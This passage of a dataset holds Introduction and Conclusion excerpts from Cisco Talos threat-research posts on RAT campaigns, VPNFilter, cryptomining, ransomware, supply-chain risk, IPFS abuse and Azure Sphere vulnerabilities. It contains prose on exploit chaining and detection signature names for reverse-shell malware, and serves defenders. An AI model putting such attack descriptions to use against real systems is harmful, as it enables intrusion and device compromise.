"Conclusion", "content": "Adversaries are always working to find the best, most effective way to compromise systems and increasingly, that relies on the user. As such, these miscreants are constantly working to try and find the most effective lures to get users to infect themselves. Current events will always be a vital part of the threat landscape and something that organizations should have procedures and processes in place to help mitigate. \nSecurity teams big and small should be working to help mitigate the threat of current event lures, on relatively regular intervals. Including it in your training and ongoing user education is paramount. Sending an email warning your users of attacks leveraging a specific lure, may stop some users from getting infected, or might get them to report something that already happened. \nHowever, there are many other areas that organizations need to leverage to help mitigate these threats. This includes proactive hunting exercises using these keywords as anchors. Set out to hunt through your internal telemetry and find the threats that both succeeded and failed. Use them as content for your ongoing education and show users the common ways these things can be abused by adversaries. \nFinally, for more mature security organizations, try to leverage these current events against your own users. Have your red team start focusing on running current event-based campaigns using things like email and messaging platforms and report the results back up through the management chain. As you continue to routinely run these campaigns you should be able to track how your training and education is improving your success rates, or not. The point is that if you ignore these lures you are doing your organization a disservice. These lures are going to continue and the sooner you start making that part of your operational security plan, the better suited you will be to avoid a catastrophe. \nRELATED CONTENT ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra \nTHURSDAY, AUGUST 19, 2021 07:58 \nBy Asheer Malhotra and Vitor Ventura, with contributions from Vanja Svajcer. \nCisco Talos has observed a new malware campaign delivering commodity RATs, including njRAT and AsyncRAT.   \nThe campaign targets travel and hospitality organizations in Latin America.   \nTechniques utilized in this campaign bear a resemblance to those of the Aggah group but are operated by a distinct threat actor based out of Brazil.   \nWe've also discovered a builder/crypter known as \"Crypter 3losh rat\" used to generate various stages of the highly modularized infection chain used by the campaign operators. We've also seen instances where the crypter author has operated their own malicious campaigns abusing archive[.]org. \nWhat's new? \nCisco Talos recently observed a new set of campaigns targeting Latin American countries. These campaigns use a multitude of infection components to deliver two widely popular commodity malware and remote access trojans (RATs): njRAT and AsyncRAT. \nWe also discovered a .NET-based infection chain builder/crypter binary used to generate the malicious infection artifacts used in recent campaigns, including the ones targeting Latin America. Such builders indicate the author's intent to bundle malware generation functionalities for easy distribution and use by operators, customers and affiliates. \nWe've also observed some resemblance to the tactics and techniques used by a known crimeware actor \"Aggah,\" especially the final payload delivery stages. Aggah has traditionally utilized highly modular infection chains with a focus on hosting malicious payloads on public repositories such as Pastebin, Web Archive and Blogger. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This campaign details a crypter used by operators to build infection artifacts for spreading malware in Latin America with a focus on the travel and hospitality industry. The campaign started in October 2020 and is currently ongoing. The fact that the actor is regional does provide the advantage of being able to write more targeted and perfect emails. This is a good example on how an actor can inflict losses to organizations without being part of an APT or a crimeware syndicate. \nThe variety and the ease of generating infection artifacts via Crypters indicates that the attackers will likely expand their net of victims to more industries and geographies. \nThe threat actor authoring the crypter primarily aims to sell it as a service. We've observed the authors' advertise their crypters on Facebook, YouTube and other social media. However, we've also discovered that the crypter's authors have conducted their own malware campaigns abusing archive[.]org to deliver commodity RATs. \nThe highly modular structure of the Latin American attack indicates a focus on stealth to deliver two widely popular RAT families of AsynRAT and njRAT. These techniques along with other indicators are shared with the Aggah group indicating that the crypter author might have sold it to both parties. \nOrganizations should remain vigilant against such threats as they are likely to proliferate in the future. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. ", "source": "Cisco"}, {"title": "Introduction", "content": "Absent contributions from traditional intelligence capacities, the available evidence linking the Olympic Destroyer malware to a specific threat actor group is contradictory, and does not allow https://blog.talosintelligence.com/who-wasnt-responsible-for-olympic/ \nfor unambiguous attribution. The threat actor responsible for the attack has purposefully included evidence to frustrate analysts and lead researchers to false attribution flags. This false attribution could embolden an adversary to deny an accusation, publicly citing evidence based upon false claims by unwitting third parties. Attribution, while headline grabbing, is difficult and not an exact science. This must force one to question purely software-based attribution going forward. ", "source": "Cisco"}, {"title": "Introduction", "content": "The Olympic Games in Pyeongchang, South Korea were disrupted by a cyber attack earlier this month. Reportedly, the attack resulted in the Olympic website being knocked offline, meaning individuals could not print their tickets. Reporting on the opening ceremony was also degraded due to WiFi failing for reporters on site. On Feb. 12, Talos published a blog detailing the functionality of the malware Olympic Destroyer that we have identified with moderate confidence as having been used in the attack. \nExample press quotes suggesting attribution for Olympic Destroyer. \nThe malware did not write itself, the incident did not happen by accident, but who was responsible? Attributing attacks to specific malware writers or threat actor groups is not a simple or exact science. Many parameters must be considered, analysed and compared with previous attacks in order to identify similarities. As with any crime, criminals have preferred techniques, and tend to leave behind traces, akin to digital fingerprints, which can be found and linked to other crimes. \nIn terms of cyber security incidents, analysts would look for similarities for attributes such as: ", "source": "Cisco"}, {"title": "Conclusion", "content": "Attribution is hard. Rarely do analysts reach the level of evidence that would lead to a conviction in a courtroom. Many were quick to jump to conclusions, and to attribute Olympic Destroyer to specific groups. However, the basis for such accusations are frequently weak. Now that we are potentially seeing malware authors placing multiple false flags, attribution based off malware samples alone has become even more difficult. \nFor the threat actors considered, there is no clear smoking gun indicating a guilty party with the evidence which we have available. Other security analysts and investigative bodies may have further evidence to which we do not have access. Organisations with additional evidence, such as signal intelligence or human intelligence sources which may provide significant clues to attribution, may be the least likely to share their insights so as not to betray the nature of their intelligence-gathering operation. \nThe attack which we believe Olympic Destroyer to have been associated with was clearly an audacious attack, almost certainly conducted by a threat actor with a certain level of sophistication who did not believe that they would be easily identified and held accountable. \nCode sharing between threat actors is to be expected. Open-source tools are a useful source of functionality, and adopting techniques from successful attacks conducted by other groups are likely to be sources of misleading evidence leading to false attribution. \nEqually, we can expect sophisticated threat actors to take advantage of this, and to integrate evidence designed to fool analysts, to lead to attribution of their attacks to other groups. Potentially, threat actors take pleasure in reading incorrect information being published by security analysts. This could even be taken to the extreme of a country denying an attack based upon evidence presented by an unwitting third party due to false attribution. Every time there is misattribution it gives adversaries something to hide behind. In this heightened era of fake news attribution is a highly sensitive issue. \nAs threat actors evolve their skills and techniques, it is likely that we see threat actors further adopting ruses to complicate and confuse attribution. Attribution is already difficult. It is unlikely to become easier. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Jaeson Schultz \nTUESDAY, OCTOBER 4, 2022 08:51\nON THE RADAR \nOver the past several years, high-profile software supply chain attacks have increased in frequency. These attacks can be difficult to detect and source code repositories became a key focus of this research. \nDeveloper account takeovers present a substantial risk to the software supply chain because attackers who successfully compromise a developer account could conceal malicious code in software packages used by others. \nTalos analyzed several of the major software repositories to assess the level of developer account security, focusing specifically on whether developer accounts could be recovered by re-registering expired domain names and triggering password resets. \nMany software repositories have already begun taking steps to enhance the security of developer accounts. Talos has identified additional areas where the security of developer accounts could be improved. Talos worked with vulnerable repositories to resolve issues that we found. \nSoftware supply chain attacks, once the exclusive province of sophisticated state-sponsored attackers, have been gaining popularity recently among a broader range of cyber criminals. Attackers everywhere have realized that software supply chain attacks can be very effective, and can result in a large number of compromised victims. Software supply chain attacks more than tripled in 2021 when compared with 2020. \nWhy are software supply chain attacks so effective? Organizations that possess solid cyber defenses may be difficult to attack directly. However, these same organizations are likely vulnerable to a software supply chain attack because they still regularly run/build software obtained from vendors who are trusted. \nRather than attacking an entire software repository itself, or identifying an unpatched vulnerability in a software package, compromising the software supply chain can be as simple as attacking the accounts of the package developers and maintainers. Most software repositories track the identities of their software developers using those developers' email addresses. If a cybercriminal somehow gains access to a developer's email account, the attacker can theoretically generate password reset emails at these software repositories and take over the account belonging to that developer. Once inside, an attacker could then publish malicious updates to the code maintained by that developer, affecting every other piece of software that uses that library from then on. \nCisco Talos examined several frequently used code repositories. We looked specifically at the security afforded to developer accounts, and how difficult it would be for an attacker to take over a developer account. While some repositories had stringent security in place, others did not. Fortunately, worked with the managers of these repositories to resolve the major issues we found. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The software supply chain attack problem is not likely to go away anytime soon. It is unreasonable to ask organizations to vet every piece of software that runs in their environment. Some amount of trust in software vendors and suppliers will always be necessary. However, that doesn't mean that defenders are helpless against these types of attacks. \nOrganizations should analyze what software is required on various internal systems. Many times, there may be opportunities to segment a group of systems running a particular piece of software from the rest of the internal network. This way, any compromise that occurs as a result of a software supply chain attack will be limited in scope. Obviously, there are limitations to this approach. \nAll parties in the software supply chain need to take more responsibility for security. For example, it would be far safer for software repositories to stop publishing or releasing any information related to a developer's email address. Yes, this is arguably a bit of security-by-obscurity, but it forces attackers to go elsewhere to correlate the email account of a developer with the particular software package in question, and greatly enhances the security of the repository. If a repository wishes to publish a developer's email address, it could instead give each developer an email address at the domain of the repository itself (ex., @npmjs.com, @cpan.org, etc.). \nDeveloper account body snatchers pose risks to the software supply chain \nForcing MFA on the most popular package maintainers also seems to be a sensible remedy that is currently being pursued by several repositories. However, security is always a delicate balance. If you sacrifice too much usability in the pursuit of security, developers may rebel, as was the case with PyPI developer \"untitaker.\" \nOne sure-fire countermeasure against developer account takeover via expired domain registration is code signing. This is really the best way to be sure that the code you use has not been tampered with since it was last signed, and is indeed from a developer you trust. An attacker who gets control of a developer's expired domain name would have no way to recover the code signing keys belonging to that developer and no way to impersonate that developer. \nRELATED CONTENT ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra \nTHURSDAY, FEBRUARY 20, 2020 11:06 \nCisco Talos has observed a malware campaign that utilizes malicious Microsoft Office documents (maldocs) to spread a remote access trojan (RAT) we're calling \"ObliqueRAT.\" These maldocs use malicious macros to deliver the second stage RAT payload. This campaign appears to target organizations in Southeast Asia. Network based detection, although important, should be combined with endpoint protections to combat this threat and provide multiple layers of security. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This campaign shows a threat actor conducting a targeted distribution of maldocs similar to those utilized in the distribution of CrimsonRAT. However, what stands out here is that the actor is now distributing a new family of RATS. Although it isn't technically sophisticated, ObliqueRAT consists of a plethora of capabilities that can be used to carry out various malicious activities on the infected endpoint. The fact that the maldocs are password protected (and that the ObliqueRAT implant consists of probable anti-analysis techniques) indicates the attackers' intent to hide the malicious activities of the infection from an analyst. This campaign started in January 2020 and is still ongoing. This campaign also shows us that while network-based detection is important, it must be complemented with system behavior analysis and endpoint protections. ", "source": "Cisco"}, {"title": "Introduction", "content": "As a seasoned incident responder, and now IR business leader here at Cisco Talos Incident Response (CTIR), I have always said that incident response is the ultimate team sport. People are building blocks for organizations - and an effective incident response is about people, relationships and leveraging those relationships into the incident response workflow (processes and security instrumentation). This all plays a part in effectively containing and eradicating a determined adversary from the organization's network environment. \nTo highlight this, I want to share a recent CTIR engagement that shows how we can work together with an organization's IR and IT teams to quickly contain and remediate a threat. In this case, we dealt with an adversary that could critically affect a business by deploying ransomware and virtually completely shutting down their network. One of my favorite parts about my role with CTIR is the customer relationships I get to build around the world by leveraging our awesome Cisco Secure collaboration technology to work from anywhere and at home during the pandemic. I hear first-hand about the challenges and successes our customers have facing today's most challenging threats. \nThis customer case study I am going to highlight is a publicly traded company with more than \\$8 billion in revenue. This incident was even more complicated because the company was going through a merger and acquisition when the customer CISO received a phone call from my \norganization. This customer had an existing IR retainer with us and has a strong relationship with my organization - to the extent that we are viewed as an extended team. We notified this customer after we identified suspicious Cobalt Strike activity and TTPs consistent with preransomware activity via SecureX telemetry. \n\"Our Cisco Talos partners recognize the critical role relationships play in cybersecurity and Incident Response. The Talos Team has invested significant time and effort in us to fully understand our people and environment before an incident occurred. Together, we built familiarity and trust between our teams that can only be obtained through constant engagement and drills. When we were faced with a significant security incident, that trust and familiarity were the key differentiators that enabled us to successfully contain the threat and minimize damages,\" customer CISO. ", "source": "Cisco"}, {"title": "Detection", "content": "This blog post will only highlight endpoint analysis, but the same approach was included in our analysis plan for the two compromised domain controllers. \nBased upon our global SecureX telemetry and the customer's Cisco Secure Endpoint deployment, we were identified patient zero and focused our forensic analysis efforts on three key systems as part of our analysis plan: \n1. Endpoint (Patient Zero): Windows 10 Enterprise 1909   \n2. Domain Controller 1 (DC1): Windows Server 2016 Standard   \n3. Domain Controller 2 (DC2): Windows Server 2012 R2 Standard ", "source": "Cisco"}, {"title": "Conclusion", "content": "I am grateful for the mutual, high-trust relationship between this customer and my organization. Incident response is a relationship-driven business. CTIR retainers are critical for organizations to augment their IR capabilities. A tested incident response plan that accurately reflects your organization's current capabilities is critical, as evidenced in the two Case Studieswe released today. Organizational and third-party relationships are tested during a crisis. It's important that there is an elevated level of trust between IR team and client, and that there is an established and agreed-upon process when time is of the essence to prevent an enterprise-wide ransomware attack when adversary pre-ransomware activity is identified. CISOs and executives should review and refine third-party relationships on a routine basis. Have your third-party IR relationships been tried and tested - and are those relationships resilient? \nIf you want to learn more about CTIR, check out our website here and visit us at this year's virtual RSA Conference this week. \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "There is another large-scale cryptomining attack from an actor we are tracking as \"Vivin\" that has been active since at least November 2017. \n\"Vivin\" has consistently evolved over the past few years, despite having poor operational security and exposing key details of their campaign. \nTalos has identified a new threat actor, internally tracked as \"Vivin,\" conducting a long-term cryptomining campaign. We first began linking different samples of malware dropping illicit coin miners to the same actor in November of 2019. However, upon further investigation, Talos established a much longer timeline of activity. Observable evidence shows that Vivin has been active since at least November 2017 and is responsible for mining thousands of U.S. dollars in Monero cryptocurrency off of their infected hosts. \nVivin has shown to rotate the use of multiple cryptocurrency wallet addresses, in addition to altering the delivery chain of their payloads, over different time periods of activity. An interesting aspect of the actor's delivery method is their use of modified pirated software as their initial attack vector before the samples move on to common \"living-off-the-land\" methods at later stages of the attack. Vivin makes a minimal effort to hide their actions, making poor operational security decisions such as posting the same Monero wallet address found in our observable samples on online forms and social media. Nor do they discriminate in their targeting, attempting to capitalize on general user behavior, rather than targeting, to generate as large a victim pool as possible. \nDespite the market downturn for cryptocurrency values in 2018, cryptomining remained a popular attack method for malicious actors throughout 2019 and heading into 2020. Over the course of last year, Talos Incident Response observed a number of cryptomining attacks, some of which potentially involved higher coordinated cybercrime groups and collaboration between multiple different threat actors. While more sophisticated actors certainly pose a significant threat, organizations should remain cognizant of the additional threat posed by less advanced actors employing wide or unrestricted targeting. Talos has previously documented one such actor, \"Panda,\" illustrating their potential for longterm exploitation of their victims' resources and their resilience from being deterred from future action. These attributes make Vivin, and other actors like them, legitimate risks to organizational resource abuse and potential data theft. \nThe tactics, techniques, and procedures (TTPs) used by Vivin expose the actor's campaigns to multiple potential points of mitigation. Some of these include good systems hygiene such as preventing the use of pirated software on endpoints, proper event logging and monitoring, and systems resource monitoring. Other mitigation strategies involve a more active defense. For example, blocking the URIs used by the mining pools and the malware's intermediate stages. Detection signatures can also prevent the XMRig miner from being dropped and executed on targeted hosts. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The length of historical activity by Vivin, the multitude of wallets and malware execution infrastructure, and the actor's somewhat flippant attitude towards operational security suggests that the Vivin will attempt to continue their operations for the foreseeable future. Perhaps more telling is the actor's willingness to continuously roll over their infrastructure over a long period of time. As evidenced before, if enough of their infrastructure gets exposed, Vivin will likely abandon the iteration of malware, their execution chains, and potentially switch mining services. \nIt is easy to want to dismiss non targeted attacks and less sophisticated threat actors as inconsequential; however actors like Vivin remain viable threats to organizations. Among the wallet addresses Talos was able to link to Vivin, they have already mined thousands of dollars worth of cryptocurrency. The substantial growth in hash rates for the actor's Dec. 9 campaign also suggests that they could be significantly improving their delivery methods and infection rates. Aside from siphoning resources from organizations, the malware used to drop XMRig could also be modified for data theft, credential harvesting, and other malicious activity. Talos will continue to monitor activity by this actor and update or expand this post with any additional information. ", "source": "Cisco"}, {"title": "Introduction", "content": "Ransomware: Because OpSec is Hard? \nBy Warren Mercer \nMONDAY, JULY 25, 2016 11:01 \nRANSOMWARE \nThis blog was authored by Edmund Brumaghin and Warren Mercer \nSummary \nTalos recently published research regarding a new variant of destructive ransomware, which we dubbed Ranscam. During further analysis of Ranscam samples, we discovered several indicators of compromise (IOCs) that piqued our curiosity as to which malware this threat actor might be involved in or responsible for besides Ranscam. We began to expand the scope of our research into other destructive \"ranscamware\" in an effort to determine if they had any shared characteristics that might indicate the same threat actor or group might be responsible for multiple variants. We found several interesting ties between known destructive ransomware variants such as Jigsaw and AnonPop which correlated with the threat actor we believe to be responsible for Ranscam. ", "source": "Cisco"}, {"title": "Conclusion", "content": "As we have further analyzed the IOCs associated with Ranscam, we have been able to draw several ties back to IOCs associated with other destructive malware variants that were previously discovered, including Jigsaw and Anonpop. As observed by tracking the activities of the threat actor associated with Ranscam, new versions of this destructive malware are continuing to be developed and used in an attempt to coerce victims into paying out without necessarily requiring the threat actor to invest the resources required to maintain an advanced or stealthy operation. \nThis also provides evidence that indicates that while there may be a greater number of distinct destructive ransomware variants targeting systems, this may not directly correlate to a larger number of distinct threat actors operating in the ransomware space. As seen in this example, a single actor could be responsible for multiple distinct variants in an attempt to maximize their profits, or as they refine their tactics in an attempt to maximize the amount of revenue they collect from victims. ", "source": "Cisco"}, {"title": "Introduction", "content": "By William Largent \nWEDNESDAY, MAY 23, 2018 09:00\nFor several months, Talos has been working with public- and private-sector threat intelligence partners and law enforcement in researching an advanced, likely state-sponsored or stateaffiliated actor's widespread use of a sophisticated modular malware system we call \"VPNFilter.\" We have not completed our research, but recent events have convinced us that the correct way forward is to now share our findings so that affected parties can take the appropriate action to defend themselves.  In particular, the code of this malware overlaps with versions of the \nBlackEnergy malware - which was responsible for multiple large-scale attacks that targeted devices in Ukraine. While this isn't definitive by any means, we have also observed VPNFilter, a potentially destructive malware, actively infecting Ukrainian hosts at an alarming rate, utilizing a command and control (C2) infrastructure dedicated to that country. Weighing these factors together, we felt it was best to publish our findings so far prior to completing our research. Publishing early means that we don't yet have all the answers - we may not even have all the questions - so this blog represents our findings as of today, and we will update our findings as we continue our investigation. \nBoth the scale and the capability of this operation are concerning. Working with our partners, we estimate the number of infected devices to be at least 500,000 in at least 54 countries. The known devices affected by VPNFilter are Linksys, MikroTik, NETGEAR and TP-Link networking equipment in the small and home office (SOHO) space, as well at QNAP network-attached storage (NAS) devices. No other vendors, including Cisco, have been observed as infected by VPNFilter, but our research continues. The behavior of this malware on networking equipment is particularly concerning, as components of the VPNFilter malware allows for theft of website credentials and monitoring of Modbus SCADA protocols. Lastly, the malware has a destructive capability that can render an infected device unusable, which can be triggered on individual victim machines or en masse, and has the potential of cutting off internet access for hundreds of thousands of victims worldwide. \nThe type of devices targeted by this actor are difficult to defend. They are frequently on the perimeter of the network, with no intrusion protection system (IPS) in place, and typically do not have an available host-based protection system such as an anti-virus (AV) package. We are unsure of the particular exploit used in any given case, but most devices targeted, particularly in older versions, have known public exploits or default credentials that make compromise relatively straightforward. All of this has contributed to the quiet growth of this threat since at least 2016. \nThis post provides the technical findings you would normally see in a Talos blog. In addition, we will detail some thoughts on the tradecraft behind this threat, using our findings and the background of our analysts, to discuss the possible thought process and decisions made by the actor. We will also discuss how to defend against this threat and how to handle a device that may be infected. Finally, we will share the IOCs that we have observed to this point, although we are confident there are more that we have not seen. ", "source": "Cisco"}, {"title": "Conclusion", "content": "VPNFilter is an expansive, robust, highly capable, and dangerous threat that targets devices that are challenging to defend. Its highly modular framework allows for rapid changes to the actor's operational infrastructure, serving their goals of misattribution, intelligence collection, and finding a platform to conduct attacks. \nThe destructive capability particularly concerns us. This shows that the actor is willing to burn users' devices to cover up their tracks, going much further than simply removing traces of the malware. If it suited their goals, this command could be executed on a broad scale, potentially rendering hundreds of thousands of devices unusable, disabling internet access for hundreds of thousands of victims worldwide or in a focused region where it suited the actor's purposes. \nWhile the threat to IoT devices is nothing new, the fact that these devices are being used by advanced nation-state actors to conduct cyber operations, which could potentially result in the destruction of the device, has greatly increased the urgency of dealing with this issue. We call on the entire security community to join us in aggressively countering this threat. \nWe will continue to monitor VPNFilter and work with our partners to understand the threat as it continues to evolve in order to ensure that our customers remain protected and the public is informed. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Claudio Bozzato and Lilith [>_>]. \nIn May 2020, Microsoft kicked off the Azure Sphere Security Research Challenge, a three-month initiative aimed at finding bugs in Azure Sphere. In the first three months, Cisco Talos reported 16 vulnerabilities. Our analysis continued intermittently, and eventually, we discovered and reported a total of 31 published vulnerabilities, two of which were present in the Linux kernel itself. \nWe already released several blog posts about Azure Sphere (see blog posts 1, 2, 3, 4, 5). Today, we're putting a bow on our research by summarizing what we've found and how attackers could exploit them, and what that would mean for the user. We also have another blog post coming next week that will detail how we exploited a chain of two vulnerabilities to gain arbitrary kernel code execution. ", "source": "Cisco"}, {"title": "Conclusion", "content": "As part of our research into Azure Sphere, we disclosed and helped fix 31 vulnerabilities that we've found in the device, starting from code execution in a customer application, up to firmware downgrade and Secmon information disclosures. There are many ways to chain the above vulnerabilities to reach this goal, just pick in sequence: \nAny issue from the \"Unsigned code execution\" section. Any \"Information disclosure\" and \"Memory corruption\" from the \"Normal World\" section. Alternatively, the \"Privilege escalation chain\" subsection for the \"Normal World.\" \nA \"Firmware downgrade\" or an \"Information disclosure\" issue from the \"Security Monitor\" section. \nAs discussed in the \"Firmware downgrade\" section, this is one of the most critical exploitation paths, since it would lead to a full compromise of the device, which, in the worst-case scenario, might allow an attacker to maintain persistence in the device, even bypassing remote attestation. \nHowever, even without fully compromising Pluton or Security Monitor, an attacker could still carry out a range of malicious acts, including:   \nArbitrary userland/kernel code can be run, so the Linux side can be controlled by an attacker over the network. For example, it can be made part of a botnet.   \nAll company/customer applications on the box would obviously be fully compromised as well, together with their data.   \nRemote attestation would likely not be able to verify that the Linux Normal World has been tampered with, because this exploit chain does not require any changes in the firmware of the device.   \nUpdates could easily be disabled (they're handled by a userland process), although this could in theory be detected when a new version gets released, as the automatic updates would fail. The device could be bricked (until manual recovery over USB) in several different ways (TALOS-2020-1129, TALOS-2021-1311, TALOS-2021-1341).   \nThe ability to turn off the device via software could be disabled since we can simply discard such requests. \nAlso worth noting, in theory, since an exploit doesn't necessarily need to flash new firmware in order to maintain persistence or act as part of a botnet, access to the Azure cloud would still be available since device attestation depends on image signatures (which don't necessarily have to change). \nIn other words, it might be easier to list what we cannot do: \nExecute code in the higher-privileged cores (Pluton/Secmon), although TALOS-2021-1342 and TALOS-2021-1344 combined with an additional vulnerability could definitely help in achieving this.   \nExtract the Device's hardware private key. \nRELATED CONTENT \nBadgerboard: A PLC backplane network visibility module M A R C H 5 , 2 0 2 4 1 5 : 3 0 \nAnalysis of the traffic between networked devices has always been of interest since devices could even communicate with one another.  As the complexity of networks grew, the more useful dedicated traffic analysis tools became. Major advancements have been made over the years with tools like Snort or Wireshark, but these \nThe many vulnerabilities Talos discovered in SOHO and industrial wireless routers post-VPNFilter \nAU G U S T 2 , 2 0 2 3 0 8 : 0 0 \nGiven the privileged position these devices occupy on the networks they serve, they are prime targets for attackers, so their security posture is of paramount importance. \nUncovering weaknesses in Apple macOS and VMWare vCenter: 12 vulnerabilities in RPC implementation \nJ U LY 1 3 , 2 0 2 3 1 2 : 0 0 \nUncovered issues fall into use-after-free, buffer-overflow, information leak and denial of service vulnerability classes. Some of these could be combined to achieve remote code execution or privilege escalation. ", "source": "Cisco"}, {"title": "Introduction", "content": "Talos has observed a cyber attack which was launched using the official website of Ukrainebased accounting software developer Crystal Finance Millennium (CFM). This vector is similar to the attack outlined by Talos in the Nyetya and companion MeDoc blog post. Ukrainian authorities and businesses were alerted by local security firm (ISSP) that another accounting software maker had been compromised. However, the attackers did not compromise the firm's update servers and did not have the level of access noted in the Nyetya compromise. CFM's website was being used to distribute malware that was retrieved by malware downloaders attached to messages associated with a concurrent spam campaign. Websites being compromised to serve malicious content is common and it appears that CFM's website was leveraged in the same way. This can be achieved through exploitation of existing vulnerabilities in server-side software or brute-forcing weak credentials, allowing attackers to gain remote administrative access. The fact that it is an accounting software company in Ukraine and the timing of the attack increased visibility. \nThis attack occurred in August 2017, during the time frame associated with the observance of the Independence Day holiday in Ukraine. The details of the specific malware infection process itself have been previously documented here. Talos was able to register and sinkhole one of the Command and Control (C2) domains and through this, obtain additional details regarding the scope of this attack and associated victims. This blog provides additional information related to the geographic regions that were targeted by this attack as well as the size and scope of of systems that were successfully compromised. ", "source": "Cisco"}, {"title": "Conclusion", "content": "As we saw repeatedly throughout 2017, attackers are increasingly attempting to abuse the trust relationship between organizations and their trusted software manufacturers as a means of obtaining a foothold within the environments they are targeting. As organizations deploy more effective security controls to protect their network environments attackers are continuing to refine their methodologies. Talos will continue to monitor the threat landscape to identify new attacks and ensure that customers remain protected from these new supply chain based attacks as they become increasingly prevalent and continue to evolve. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. \nNetwork Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIOC's ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nWEDNESDAY, NOVEMBER 9, 2022 08:00\nTHREAT SPOTLIGHT THREATS SECUREX\nThe InterPlanetary File System (IPFS) is an emerging Web3 technology that is currently seeing widespread abuse by threat actors. Cisco Talos has observed multiple ongoing campaigns that leverage the IPFS network to host their malware payloads and phishing kit infrastructure while facilitating other attacks. \nIPFS is often used for legitimate purposes, which makes it more difficult for security teams to differentiate between benign and malicious IPFS activity in their networks. Multiple malware families are currently being hosted within IPFS and retrieved during the initial stages of malware attacks. Organizations should become familiar with these new technologies and how they are being leveraged by threat actors to defend against new techniques that use them. \nThe emergence of new Web3 technologies in recent years has resulted in drastic changes to the way content is hosted and accessed on the internet. Many of these technologies are focused on circumventing censorship and decentralizing control of large portions of the content and infrastructure people use and access on a regular basis. While these technologies have legitimate uses in a variety of practical applications, they also create opportunities for adversaries to take advantage of them within their phishing and malware distribution campaigns. Over the past few years, Talos has observed an increase in the number of cybercriminals taking advantage of technologies like the InterPlanetary File System (IPFS) to facilitate the hosting of malicious content as they provide the equivalent of \"bulletproof hosting\" and are extremely resilient to attempts to moderate the content stored there. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Many new Web3 technologies have emerged recently, attempting to provide valuable functionality to users. As these technologies have continued to see increased adoption for legitimate purposes, they have begun to be leveraged by adversaries as well. We have continued to observe an increase in the volume of malware and phishing campaigns that are taking advantage of \ntechnologies like IPFS for the purposes of hosting malicious components used in malware infections, phishing kits used to collect sensitive authentication data and more. \nWe expect this activity to continue to increase as more threat actors recognize that IPFS can be used to facilitate bulletproof hosting, is resilient against content moderation and law enforcement activities, and introduces problems for organizations attempting to detect and defend against attacks that may leverage the IPFS network. Organizations should be aware of how these newly emerging technologies are being actively used across the threat landscape and evaluate how to best implement security controls to prevent or detect successful attacks in their environments. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nThe following Snort SIDs are applicable to this threat: 60728. \nThe following ClamAV signatures are applicable to this threat: \nWin.Trojan.AgentTesla-9974905-1   \nPdf.Phishing.Agent-9974919-0   \nTxt.Malware.ArtifactDeletion-9974896-0   \nWin.Trojan.AgentTesla-9974906-0   \nWin.Downloader.ReverseShell-9974652-1   \nWin.Loader.Hannabi-9974435-0   \nWin.Trojan.Hannabi_Grabber-9974436-0   \nPy.Malware.ReverseShell-9974437-0 ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini \nTUESDAY, JUNE 22, 2021 07:56 \nTHREAT SPOTLIGHT\nBy Nick Biasini. \nIn today's world of threat research, the focus tends to be on the overtly malicious practice of distributing and installing malware on end systems. But this is 